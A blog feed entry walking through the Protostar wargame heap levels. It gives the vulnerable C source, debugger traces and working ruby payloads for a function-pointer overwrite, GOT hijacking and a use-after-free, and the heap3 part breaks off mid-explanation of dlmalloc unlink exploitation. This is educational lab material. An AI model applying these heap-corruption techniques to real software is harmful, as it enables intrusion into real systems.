<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Exploit-exercises | 0x73696e65]]></title>
  <link href="http://73696e65.github.io/blog/categories/exploit-exercises/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-07-04T15:46:55+02:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Heap Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/07/04/exploit-exercises-protostar-heap-levels/"/>
    <updated>2015-07-04T09:29:50+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/07/04/exploit-exercises-protostar-heap-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<h2>Protostar Heap0</h2>

<p>{% codeblock lang:c heap0.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<p>struct data {
  char name[64];
};</p>

<p>struct fp {
  int (*fp)();
};</p>

<p>void winner()
{
  printf(&ldquo;level passed\n&rdquo;);
}</p>

<p>void nowinner()
{
  printf(&ldquo;level has not been passed\n&rdquo;);
}</p>

<p>int main(int argc, char <em><em>argv)
{
  struct data </em>d;
  struct fp </em>f;</p>

<p>  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;</p>

<p>  printf(&ldquo;data is at %p, fp is at %p\n&rdquo;, d, f);</p>

<p>  strcpy(d->name, argv[1]);</p>

<p>  f->fp();</p>

<p>}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ gdb -q /opt/protostar/bin/heap0
Really redefine built-in command &ldquo;frame&rdquo;? (y or n) [answered Y; input not from terminal]
Really redefine built-in command &ldquo;thread&rdquo;? (y or n) [answered Y; input not from terminal]
Really redefine built-in command &ldquo;start&rdquo;? (y or n) [answered Y; input not from terminal]
Reading symbols from /opt/protostar/bin/heap0&hellip;done.</p>

<p>gdb> r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
data is at 0x804a008, fp is at 0x804a050</p>

<p>Program received signal SIGSEGV, Segmentation fault.</p>

<hr />

<pre><code> eax:41346341 ebx:B7FD7FF4  ecx:00000000  edx:00000065     eflags:00210246
 esi:00000000 edi:00000000  esp:BFFFF70C  ebp:BFFFF738     eip:41346341
 cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
</code></pre>

<p>[007B:BFFFF70C]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
BFFFF73C : 76 DC EA B7  02 00 00 00 - E4 F7 FF BF  F0 F7 FF BF v&hellip;&hellip;&hellip;&hellip;&hellip;
BFFFF72C : 50 A0 04 08  20 85 04 08 - 00 00 00 00  B8 F7 FF BF P&hellip; &hellip;&hellip;&hellip;..
BFFFF71C : 38 F7 FF BF  65 63 EC B7 - 40 10 FF B7  08 A0 04 08 8&hellip;ec..@&hellip;&hellip;.
BFFFF70C : FF 84 04 08  08 A0 04 08 - 1D F9 FF BF  50 A0 04 08 &hellip;&hellip;&hellip;&hellip;P&hellip;
[007B:41346341]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
41346341 : Error while running hook_stop:
Cannot access memory at address 0x41346341
0x41346341 in ?? ()
{% endcodeblock %}</p>

<p><code>0x41346341</code> represents the offset 72, also <code>0x804a050 - 0x804a008 = 72</code>. So we
write 64B to <code>d-&gt;name</code> and after another 8B, there is the address of <code>fp</code>.</p>

<p>To verify our statement, we use ltrace and gdb:</p>

<p>{% codeblock %}
user@protostar:~$ ltrace /opt/protostar/bin/heap0 1337
__libc_start_main(0x804848c, 2, 0xbffff844, 0x8048520, 0x8048510 <unfinished ...>
malloc(64)                                                      = 0x0804a008
malloc(4)                                                       = 0x0804a050
printf(&ldquo;data is at %p, fp is at %p\n&rdquo;, 0x804a008, 0x804a050data is at 0x804a008, f
)                                                                  = 41
strcpy(0x0804a008, &ldquo;1337&rdquo;)                                      = 0x0804a008
puts(&ldquo;level has not been passed&#8221;level has not been passed
)    = 26
+++ exited (status 26) +++
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ gdb -q /opt/protostar/bin/heap0
Really redefine built-in command &ldquo;frame&rdquo;? (y or n) [answered Y; input not from terminal]
Really redefine built-in command &ldquo;thread&rdquo;? (y or n) [answered Y; input not from terminal]
Really redefine built-in command &ldquo;start&rdquo;? (y or n) [answered Y; input not from terminal]
Reading symbols from /opt/protostar/bin/heap0&hellip;done.</p>

<p>gdb> b *0x80484ff
Breakpoint 1 at 0x80484ff: file heap0/heap0.c, line 40.</p>

<p>gdb> r $(ruby -e &lsquo;print &ldquo;X&rdquo; * 64&rsquo;)
data is at 0x804a008, fp is at 0x804a050
level has not been passed</p>

<hr />

<pre><code> eax:0000001A ebx:B7FD7FF4  ecx:B7FD84C0  edx:B7FD9340     eflags:00200246
 esi:00000000 edi:00000000  esp:BFFFF730  ebp:BFFFF758     eip:080484FF
 cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
</code></pre>

<p>[007B:BFFFF730]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
BFFFF760 : 02 00 00 00  04 F8 FF BF - 10 F8 FF BF  48 18 FE B7 &hellip;&hellip;&hellip;&hellip;H&hellip;
BFFFF750 : 20 85 04 08  00 00 00 00 - D8 F7 FF BF  76 DC EA B7  &hellip;&hellip;&hellip;..v&hellip;
BFFFF740 : 65 63 EC B7  40 10 FF B7 - 08 A0 04 08  50 A0 04 08 ec..@&hellip;&hellip;.P&hellip;
BFFFF730 : 08 A0 04 08  41 F9 FF BF - 50 A0 04 08  58 F7 FF BF &hellip;.A&hellip;P&hellip;X&hellip;
[007B:BFFFF730]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
BFFFF730 : 08 A0 04 08  41 F9 FF BF - 50 A0 04 08  58 F7 FF BF &hellip;.A&hellip;P&hellip;X&hellip;
BFFFF740 : 65 63 EC B7  40 10 FF B7 - 08 A0 04 08  50 A0 04 08 ec..@&hellip;&hellip;.P&hellip;
[0073:080484FF]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ code]
0x80484ff &lt;main+115>:   leave<br/>
0x8048500 &lt;main+116>:   ret  <br/>
0x8048501:  nop
0x8048502:  nop
0x8048503:  nop</p>

<h2>0x8048504:  nop</h2>

<p>Breakpoint 1, main (argc=0x2, argv=0xbffff804) at heap0/heap0.c:40
40  heap0/heap0.c: No such file or directory.
    in heap0/heap0.c</p>

<p>gdb> x /25x 0x0804a000
0x804a000:  0x00000000  0x00000049  0x58585858  0x58585858
0x804a010:  0x58585858  0x58585858  0x58585858  0x58585858
0x804a020:  0x58585858  0x58585858  0x58585858  0x58585858
0x804a030:  0x58585858  0x58585858  0x58585858  0x58585858
0x804a040:  0x58585858  0x58585858  0x00000000  0x00000011
0x804a050:  0x08048478  0x00000000  0x00000000  0x00020fa9
0x804a060:  0x00000000
{% endcodeblock %}</p>

<p>{% codeblock %}
(08) 0x0804a000: d-control
(64) 0x0804a008: d-name</p>

<p>(08) 0x0804a048: f-control
(04) 0x0804a050: f-fp
{% endcodeblock %}</p>

<p>We set <code>fp</code> to <code>winner()</code> symbol:</p>

<p>{% codeblock %}
user@protostar:~$ nm /opt/protostar/bin/heap0 | grep winner
08048478 T nowinner
08048464 T winner</p>

<p>user@protostar:~$ /opt/protostar/bin/heap0 $(ruby -e &lsquo;print &ldquo;X&rdquo;*72 + [0x08048464].pack(&ldquo;V&rdquo;)&rsquo;)
data is at 0x804a008, fp is at 0x804a050
level passed
{% endcodeblock %}</p>

<h2>Protostar Heap1</h2>

<p>{% codeblock lang:c heap1.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<p>struct internet {
  int priority;
  char *name;
};</p>

<p>void winner()
{
  printf(&ldquo;and we have a winner @ %d\n&rdquo;, time(NULL));
}</p>

<p>int main(int argc, char <em><em>argv)
{
  struct internet </em>i1, </em>i2, *i3;</p>

<p>  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);</p>

<p>  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);</p>

<p>  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);</p>

<p>  printf(&ldquo;and that&rsquo;s a wrap folks!\n&rdquo;);
}</p>

<p>{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ ltrace /opt/protostar/bin/heap1 AAAA BBBB
__libc_start_main(0x80484b9, 3, 0xbffff834, 0x8048580, 0x8048570 <unfinished ...>
malloc(8)                        = 0x0804a008
malloc(8)                        = 0x0804a018
malloc(8)                        = 0x0804a028
malloc(8)                        = 0x0804a038
strcpy(0x0804a018, &ldquo;AAAA&rdquo;)       = 0x0804a018
strcpy(0x0804a038, &ldquo;BBBB&rdquo;)       = 0x0804a038
puts(&ldquo;and that&rsquo;s a wrap folks!&#8221;and that&rsquo;s a wrap folks!
)                   = 25
+++ exited (status 25) +++
{% endcodeblock %}</p>

<p>We have four allocated chunks in memory:
{% codeblock %}
(8) 0x0804a000: i1-control
(4) 0x0804a008: i1-priority
(4) 0x0804a00c: i1-name(addr)</p>

<p>(8) 0x0804a010: i1-name-control
(8) 0x0804a018: i1-name</p>

<p>(8) 0x0804a020: i2-control
(4) 0x0804a028: i2-priority
(4) 0x0804a02c: i2-name(addr)</p>

<p>(8) 0x0804a030: i2-name-control
(8) 0x0804a038: i2-name
{% endcodeblock %}</p>

<p>After 20 bytes, we are able to change <code>i2-name(addr)</code>, that is used by second <code>strcpy()</code>.</p>

<p>{% codeblock %}
user@protostar:~$ ltrace -e strcpy /opt/protostar/bin/heap1 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 20 + [0x44444444].pack(&ldquo;V&rdquo;) &rsquo;) 2222
strcpy(0x0804a018, &ldquo;AAAAAAAAAAAAAAAAAAAADDDD&rdquo;)      = 0x0804a018
strcpy(0x44444444, &ldquo;2222&rdquo; <unfinished ...>
&mdash; SIGSEGV (Segmentation fault) &mdash;
+++ killed by SIGSEGV +++
{% endcodeblock %}</p>

<p>We use <code>Global Offset Table Hijacking</code> technique:
{% codeblock %}
user@protostar:~$ objdump -TR /opt/protostar/bin/heap1</p>

<p>/opt/protostar/bin/heap1:     file format elf32-i386</p>

<p>DYNAMIC SYMBOL TABLE:
00000000  w   D  <em>UND</em>  00000000              <strong>gmon_start</strong>
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   <em>_libc_start_main
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   strcpy
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   printf
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   time
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   malloc
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   puts
0804862c g    DO .rodata    00000004  Base        </em>IO_stdin_used</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
0804974c R_386_GLOB_DAT    <strong>gmon_start</strong>
0804975c R_386_JUMP_SLOT   <strong>gmon_start</strong>
08049760 R_386_JUMP_SLOT   __libc_start_main
08049764 R_386_JUMP_SLOT   strcpy
08049768 R_386_JUMP_SLOT   printf
0804976c R_386_JUMP_SLOT   time
08049770 R_386_JUMP_SLOT   malloc
08049774 R_386_JUMP_SLOT   puts</p>

<p>user@protostar:~$ nm /opt/protostar/bin/heap1 | grep winner
08048494 T winner
{% endcodeblock %}</p>

<p>Goal is to write the value <code>0x08048494</code> to the <code>0x08049774</code> address.</p>

<p>{% codeblock %}
strcpy(i1->name, argv[1]):
(8) 0x0804a000: i1-control
(4) 0x0804a008: i1-priority
(4) 0x0804a00c: i1-name(addr)</p>

<p>(8) 0x0804a010: i1-name-control
(8) 0x0804a018: i1-name             # AAAAAAAA</p>

<p>(8) 0x0804a020: i2-control          # AAAAAAAA
(4) 0x0804a028: i2-priority         # AAAA
(4) 0x0804a02c: i2-name(addr)       # [0x08049774].pack(&ldquo;V&rdquo;)</p>

<p>(8) 0x0804a030: i2-name-control   <br/>
(8) 0x0804a038: i2-name</p>

<p>strcpy(i2->name, argv[2]):
(8) 0x0804a000: i1-control
(4) 0x0804a008: i1-priority
(4) 0x0804a00c: i1-name(addr)</p>

<p>(8) 0x0804a010: i1-name-control
(8) 0x0804a018: i1-name             # AAAAAAAA</p>

<p>(8) 0x0804a020: i2-control          # AAAAAAAA
(4) 0x0804a028: i2-priority         # AAAA
(4) 0x0804a02c: i2-name(addr)       # [0x08049774].pack(&ldquo;V&rdquo;)</p>

<p>(8) 0x0804a030: i2-name-control
(8) 0x0804a038: i2-name             # [0x08048494].pack(&ldquo;V&rdquo;)
{% endcodeblock %}</p>

<p>The second <code>strcpy()</code> takes <code>i2-name(addr) = 0x08049774</code> and copies over there the <code>argv[2]</code> value.</p>

<p>{% codeblock %}
user@protostar:~$ ltrace /opt/protostar/bin/heap1 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 20 + [0x08049774].pack(&ldquo;V&rdquo;)&rsquo;) $(ruby -e &lsquo;print [0x08048494].pack(&ldquo;V&rdquo;)&rsquo;)
__libc_start_main(0x80484b9, 3, 0xbffff824, 0x8048580, 0x8048570 <unfinished ...>
malloc(8)                                                   = 0x0804a008
malloc(8)                                                   = 0x0804a018
malloc(8)                                                   = 0x0804a028
malloc(8)                                                   = 0x0804a038
strcpy(0x0804a018, &ldquo;AAAAAAAAAAAAAAAAAAAAt\227\004\b&rdquo;)       = 0x0804a018
strcpy(0x08049774, &ldquo;\224\204\004\b&rdquo;)                        = 0x08049774
puts(&ldquo;and that&rsquo;s a wrap folks!&rdquo; <unfinished ...>
time(NULL)                                                  = 1435153654
printf(&ldquo;and we have a winner @ %d\n&rdquo;, 1435153654and we have a winner @ 1435153654
)                                                                             = 34
&lt;&hellip; puts resumed> )                                                                                                          = 34
+++ exited (status 34) +++
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ /opt/protostar/bin/heap1 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 20 + [0x08049774].pack(&ldquo;V&rdquo;)&rsquo;) $(ruby -e &lsquo;print [0x08048494].pack(&ldquo;V&rdquo;)&rsquo;)
and we have a winner @ 1435149585
{% endcodeblock %}</p>

<h2>Protostar Heap2</h2>

<p>{% codeblock lang:c heap2.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<p>struct auth {
  char name[32];
  int auth;
};</p>

<p>struct auth <em>auth;
char </em>service;</p>

<p>int main(int argc, char **argv)
{
  char line[128];</p>

<p>  while(1) {
      printf(&ldquo;[ auth = %p, service = %p ]\n&rdquo;, auth, service);</p>

<pre><code>  if(fgets(line, sizeof(line), stdin) == NULL) break;

  if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));
      if(strlen(line + 5) &lt; 31) {
          strcpy(auth-&gt;name, line + 5);
      }
  }
  if(strncmp(line, "reset", 5) == 0) {
      free(auth);
  }
  if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
  }
  if(strncmp(line, "login", 5) == 0) {
      if(auth-&gt;auth) {
          printf("you have logged in already!\n");
      } else {
          printf("please enter your password\n");
      }
  }
</code></pre>

<p>  }
}
{% endcodeblock %}</p>

<p>Running the binary:
{% codeblock %}
user@protostar:~$ /opt/protostar/bin/heap2
[ auth = (nil), service = (nil) ]
auth 1234
[ auth = 0x804c008, service = (nil) ]
service 5678
[ auth = 0x804c008, service = 0x804c018 ]
login
please enter your password
[ auth = 0x804c008, service = 0x804c018 ]
{% endcodeblock %}</p>

<p>This is strange, the <code>service</code> variable is allocated at <code>0x0804c018</code>, but
obviously we cannot have the following heap chucks:</p>

<p>{% codeblock %}
(08) 0x0804c000: auth-control
(32) 0x0804c008: auth-name
(04) 0x0804c028: auth-auth</p>

<p>(08) 0x0804c010: service-control
(xx) 0x0804c018: service
{% endcodeblock %}</p>

<p>There should be <code>sizeof(struct auth) = 32+4</code> instead of <code>sizeof(auth) = 4</code> and in
our buggy code we allocated only four bytes of memory:</p>

<p>{% codeblock %}
auth = malloc(sizeof(auth));
memset(auth, 0, sizeof(auth));
{% endcodeblock %}</p>

<p>This is very simple <code>Use-After-Free</code> vulnerability. We need to write something
to <code>auth-auth</code>, after <code>0x0804c028-0x0804c018 = 16</code> bytes.</p>

<p>{% codeblock %}
user@protostar:~$ ltrace /opt/protostar/bin/heap2
__libc_start_main(0x8048934, 1, 0xbffff864, 0x804acc0, 0x804acb0 <unfinished ...>
printf(&ldquo;[ auth = %p, service = %p ]\n&rdquo;, (nil), (nil)[ auth = (nil), service = (nil) ]
)                                                                         = 34
fgets(auth A
&ldquo;auth A\n&rdquo;, 128, 0xb7fd8420)                                                                                            = 0xbffff730
strncmp(&ldquo;auth A\n&rdquo;, &ldquo;auth &rdquo;, 5)                                                                                               = 0
sysconf(30, 0, 0xb7fe1b28, 1, 0)                                                                                              = 4096
sbrk(4096)                                                                                                                    = 0x0804c000
sbrk(0)                                                                                                                       = 0x0804d000
memset(0x0804c008, &lsquo;\000&rsquo;, 4)                                                                                                 = 0x0804c008
strlen(&ldquo;A\n&rdquo;)                                                                                                                 = 2
strcpy(0x0804c008, &ldquo;A\n&rdquo;)                                                                                                     = 0x0804c008
strncmp(&ldquo;auth A\n&rdquo;, &ldquo;reset&rdquo;, 5)                                                                                               = -17
strncmp(&ldquo;auth A\n&rdquo;, &ldquo;service&rdquo;, 6)                                                                                             = -18
strncmp(&ldquo;auth A\n&rdquo;, &ldquo;login&rdquo;, 5)                                                                                               = -11
printf(&ldquo;[ auth = %p, service = %p ]\n&rdquo;, 0x804c008, (nil)[ auth = 0x804c008, service = (nil) ]
)                                                                     = 38
fgets(service AAAAAAAAAAAAAAA
&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, 128, 0xb7fd8420)                                                                           = 0xbffff730
strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;auth &rdquo;, 5)                                                                              = 18
strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;reset&rdquo;, 5)                                                                              = 1
strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;service&rdquo;, 6)                                                                            = 0
strdup(&ldquo; AAAAAAAAAAAAAAA\n&rdquo;)                                                                                                  = 0x0804c018
strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;login&rdquo;, 5)                                                                              = 7
printf(&ldquo;[ auth = %p, service = %p ]\n&rdquo;, 0x804c008, 0x804c018[ auth = 0x804c008, service = 0x804c018 ]
)                                                                 = 42
fgets(login
&ldquo;login\n&rdquo;, 128, 0xb7fd8420)                                                                                             = 0xbffff730
strncmp(&ldquo;login\n&rdquo;, &ldquo;auth &rdquo;, 5)                                                                                                = 11
strncmp(&ldquo;login\n&rdquo;, &ldquo;reset&rdquo;, 5)                                                                                                = -6
strncmp(&ldquo;login\n&rdquo;, &ldquo;service&rdquo;, 6)                                                                                              = -7
strncmp(&ldquo;login\n&rdquo;, &ldquo;login&rdquo;, 5)                                                                                                = 0
puts(&ldquo;you have logged in already!&#8221;you have logged in already!
)                                                                                           = 28
printf(&rdquo;[ auth = %p, service = %p ]\n&#8221;, 0x804c008, 0x804c018[ auth = 0x804c008, service = 0x804c018 ]
)                                                                 = 42
fgets(&ldquo;login\n&rdquo;, 128, 0xb7fd8420)                                                                                             = NULL
+++ exited (status 0) +++
{% endcodeblock %}</p>

<p>As we can see above, we sent 15 character + newline.</p>

<p>{% codeblock %}
user@protostar:~$ /opt/protostar/bin/heap2
[ auth = (nil), service = (nil) ]
auth A
[ auth = 0x804c008, service = (nil) ]
service AAAAAAAAAAAAAAA
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]</p>

<p>user@protostar:~$ ruby -e &lsquo;puts &ldquo;auth A&rdquo;; puts &ldquo;service &rdquo; + &ldquo;A&rdquo; * 15; puts &ldquo;login&rdquo;&rsquo; | /opt/protostar/bin/heap2
[ auth = (nil), service = (nil) ]
[ auth = 0x804c008, service = (nil) ]
[ auth = 0x804c008, service = 0x804c018 ]
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
{% endcodeblock %}</p>

<h2>Protostar Heap3</h2>

<p>This level introduces old <code>Doug Lea Malloc</code> version, which is statically linked with <code>heap3</code> binary.</p>

<p>{% codeblock lang:c heap3.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<p>void winner()
{
  printf(&ldquo;that wasn&rsquo;t too bad now, was it? @ %d\n&rdquo;, time(NULL));
}</p>

<p>int main(int argc, char <em><em>argv)
{
  char </em>a, </em>b, *c;</p>

<p>  a = malloc(32);
  b = malloc(32);
  c = malloc(32);</p>

<p>  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);</p>

<p>  free&copy;;
  free(b);
  free(a);</p>

<p>  printf(&ldquo;dynamite failed?\n&rdquo;);
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ ltrace /opt/protostar/bin/heap3 1 2 3
__libc_start_main(0x8048889, 4, 0xbffff854, 0x804ab50, 0x804ab40 <unfinished ...>
sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffff71c)             = 4096
sbrk(4096)                                                     = 0x0804c000
sbrk(0)                                                        = 0x0804d000
strcpy(0x0804c008, &ldquo;1&rdquo;)                                        = 0x0804c008
strcpy(0x0804c030, &ldquo;2&rdquo;)                                        = 0x0804c030
strcpy(0x0804c058, &ldquo;3&rdquo;)                                        = 0x0804c058
puts(&ldquo;dynamite failed?&#8221;dynamite failed?
)                                                              = 17
+++ exited (status 17) +++
{% endcodeblock %}</p>

<p>We have three chunks at the appropriate addresses:
{% codeblock %}
(08) 0x0804c000: a-control
(32) 0x0804c008: a</p>

<p>(08) 0x0804c000: b-control
(32) 0x0804c030: b</p>

<p>(08) 0x0804c050: c-control
(32) 0x0804c058: c
{% endcodeblock %}</p>

<p>There are a several great article about this topic, I recommend <a href="http://phrack.org/issues/57/8.html">Phrack 57/8</a>,
<a href="http://phrack.org/issues/57/9.html">Phrack 57/9</a>, <a href="https://www.win.tue.nl/~aeb/linux/hh/hh-11.html">Hackers Hut</a> to
explain the exploitation process in detail.</p>

<p>The malloc chunk could be considered as the following structure:</p>

<p>{% codeblock %}
GNU C Library Implementation (used chunk):</p>

<pre><code>         +----------------------------------+
chunk -&gt; | prev_size                        |
         +----------------------------------+
         | size                         |M|P|
         +----------------------------------+
  mem -&gt; | data                             |
         : ...                              :
         +----------------------------------+
</code></pre>

<p>nextchunk -> | prev_size &hellip;                    |
             :                                  :
{% endcodeblock %}</p>

<p>{% codeblock %}
Once we free() the chunk:</p>

<pre><code>         +----------------------------------+
chunk -&gt; | prev_size                        |
         +----------------------------------+
         | size                         |M|P|
         +----------------------------------+
  mem -&gt; | fd                               |
         +----------------------------------+
         | bk                               |
         +----------------------------------+
         | (old memory, can be zero bytes)  |
         :                                  :
</code></pre>

<p>nextchunk -> | prev_size &hellip;                    |
             :                                  :
{% endcodeblock %}</p>

<p>It is useful to download the <a href="https://ftp.gnu.org/gnu/glibc/glibc-2.2.3.tar.gz">glibc 2.2.3</a> source code, we are
interested, how is the <code>free()</code> implemented:</p>

<p>{% codeblock lang:c malloc/malloc.c %}
..</p>

<h1>define unlink(P, BK, FD)                                                     \</h1>

<p>{                                                                             \
  BK = P->bk;                                                                 \
  FD = P->fd;                                                                 \
  FD->bk = BK;                                                                \
  BK->fd = FD;                                                                \
}                                                                             \
..
  islr = 0;</p>

<p>  if (!(hd &amp; PREV_INUSE))                    /<em> consolidate backward </em>/
  {
    prevsz = p->prev_size;
    p = chunk_at_offset(p, -(long)prevsz);
    sz += prevsz;</p>

<pre><code>if (p-&gt;fd == last_remainder(ar_ptr))     /* keep as last_remainder */
  islr = 1;
else
  unlink(p, bck, fwd);
</code></pre>

<p>  }</p>

<p>  if (!(inuse_bit_at_offset(next, nextsz)))   /<em> consolidate forward </em>/
  {
    sz += nextsz;</p>

<pre><code>if (!islr &amp;&amp; next-&gt;fd == last_remainder(ar_ptr))
                                          /* re-insert last_remainder */
{
  islr = 1;
  link_last_remainder(ar_ptr, p);
}
else
  unlink(next, bck, fwd);

next = chunk_at_offset(p, sz);
</code></pre>

<p>  }
  else
    set_head(next, nextsz);                  /<em> clear inuse bit </em>/</p>

<p>{% endcodeblock %}</p>

<p>To call vulnerable <code>unlink()</code>, we have two branches, consolidate backward or consolidate forward.</p>

<p>We want to overwrite the jump to <code>printf/puts</code> function in <code>GOT</code> table with
the address of <code>winner()</code>.</p>

<p>Given the <code>bck</code> and <code>fwd</code> pointers that we could set arbitrary, <code>free()</code> will do <code>*(fwd+12) = bck</code>
and <code>*(bck+8) = fwd</code>. We use the first assignment to write to the arbitrary memory location.</p>

<p>Because the second assignment, we cannot simply write something to <code>.text</code> section (after <code>winner+0x8</code>),
but jumping to our shellcode stored in allocated memory would be efficient.</p>

<p>{% codeblock %}
gdb> print /x 0x08048864+0x8
$1 = 0x804886c</p>

<p>gdb> maintenance info sections
Exec file:
    `/opt/protostar/bin/heap3&#8217;, file type elf32-i386.
    0x8048114->0x8048127 at 0x00000114: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048128->0x8048148 at 0x00000128: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048148->0x804816c at 0x00000148: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804816c->0x8048234 at 0x0000016c: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048234->0x804829c at 0x00000234: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804829c->0x804848c at 0x0000029c: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804848c->0x804859a at 0x0000048c: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804859a->0x80485d8 at 0x0000059a: .gnu.version ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x80485d8->0x80485f8 at 0x000005d8: .gnu.version_r ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x80485f8->0x8048608 at 0x000005f8: .rel.dyn ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048608->0x8048680 at 0x00000608: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048680->0x80486b0 at 0x00000680: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
    0x80486b0->0x80487b0 at 0x000006b0: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
==> 0x80487b0->0x804abdc at 0x000007b0: .text ALLOC LOAD READONLY CODE HAS_CONTENTS &lt;==
    0x804abdc->0x804abf8 at 0x00002bdc: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
    0x804abf8->0x804aca0 at 0x00002bf8: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804aca0->0x804aca4 at 0x00002ca0: .eh_frame ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804b000->0x804b008 at 0x00003000: .ctors ALLOC LOAD DATA HAS_CONTENTS
    0x804b008->0x804b010 at 0x00003008: .dtors ALLOC LOAD DATA HAS_CONTENTS
    0x804b010->0x804b014 at 0x00003010: .jcr ALLOC LOAD DATA HAS_CONTENTS
    0x804b014->0x804b0e4 at 0x00003014: .dynamic ALLOC LOAD DATA HAS_CONTENTS
    0x804b0e4->0x804b0e8 at 0x000030e4: .got ALLOC LOAD DATA HAS_CONTENTS
    0x804b0e8->0x804b130 at 0x000030e8: .got.plt ALLOC LOAD DATA HAS_CONTENTS
    0x804b130->0x804b138 at 0x00003130: .data ALLOC LOAD DATA HAS_CONTENTS
    0x804b140->0x804b5d4 at 0x00003138: .bss ALLOC
    0x0000->0x3cfc at 0x00003138: .stab READONLY HAS_CONTENTS
    0x0000->0x566a at 0x00006e34: .stabstr READONLY HAS_CONTENTS
